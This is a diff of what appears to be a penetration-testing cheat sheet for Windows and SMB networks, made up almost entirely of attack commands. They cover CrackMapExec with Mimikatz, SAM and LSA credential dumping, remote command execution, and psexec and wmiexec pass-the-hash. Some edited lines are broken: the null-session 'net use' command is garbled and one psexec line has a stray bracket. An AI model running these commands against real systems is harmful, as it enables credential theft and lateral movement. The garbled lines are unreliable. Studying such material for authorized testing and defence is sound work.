@@ -103,7 +103,7 @@ python /usr/share/doc/python-impacket-doc/examples/samrdump.py <IP>
 ridenum.py <IP> 500 50000 dict.txt
 
 # Manual Null Session Testing - Windows
-net use \\<IP>\IPC$ "" /u:"
+net use \\<IP>\IPC$ "" <particao>"
 
 # Manual Null Session Testing - Linux
 smbclient -L //<IP>
@@ -144,19 +144,17 @@ crackmapexec <IP> -u <user> -H <hash> --share
 # Crackmapexec with Mimikatz
 crackmapexec smb <IP_ou_range> -u <user> -p <password> --local-auth -M mimikatz
 
+# Crackmapexec Execute Powershell
+crackmapexec <IP> -u <user> -p <password> -X '$PSVersionTable'
 
-```text
-apt-get install crackmapexec
-crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
-crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
-crackmapexec 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
-``` 
+# Crackmapexec execute command
+crackmapexec <IP> -u <user> -p <password> -x whoami #Excute
 
+# Crackmapexec SAM dump
+crackmapexec -d <domain> -u <user> -p <password> --sam
 
-```text
-crackmapexec -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
-crackmapexec -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
-```
+# Crackmapexec memory hash dump
+crackmapexec -d <domain> -u <user> -p <password> --lsa
 
 # Curl SMB Upload file
 curl --upload-file <file> -u '<user>' smb://<IP>/<sharename>/
@@ -189,45 +187,16 @@ rpcclient -k <domain>
 ./dcomexec.py -hashes <LM_NT> <user>@<IP>
 
 # psexec
-```text
-./psexec.py [[domain/]username[:password]@]<targetName or address>
-./psexec.py -hashes <LM:NT> administrator@IP #Pass-the-Hash
-psexec \\IP -u Administrator -p 123456Ww
-psexec \\IP -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
-```
+./psexec.py <domain>/<username>:<password>@]<targetName_or_address>
 
---------------------------------------------------------------------------------------------------- parei aqui
+# psexec pass-the-hash
+./psexec.py -hashes <hash> <user>@<IP> 
 
+# psexec password or pass-the-hash
+psexec \\<IP> -u <user> -p <password_or_hash>
 
+# wmiexec
+./wmiexec.py <domain>/<username>:<password>@<targetName_or_address>
 
-## Using --exec-method -1,2,3 wmiexec,atexec,smbexec
-
-
-## psexec/smbexec
-
-If no password is provided, it will be prompted
-
-
-
-## wmiexec/dcomexec
-
-Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135. In kali it is located on /usr/share/doc/python3-impacket/examples/
-
-If no password is provided, it will be prompted
-
-```text
-./wmiexec.py [[domain/]username[:password]@]<targetName or address>
-``` 
-
-Prompt for password
-
-```text
-./wmiexec.py -hashes LM:NT administrator@IP #Pass-the-Hash
-```
-
-You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
-
-Using parameter-k  you can authenticate against kerberos instead of NTLM
-
-If no password is provided, it will be prompted
-
+# wmiexec pass-the-hash (Using parameter -k you can authenticate against kerberos instead of NTLM)
+./wmiexec.py -hashes <hash> <user>@<IP>
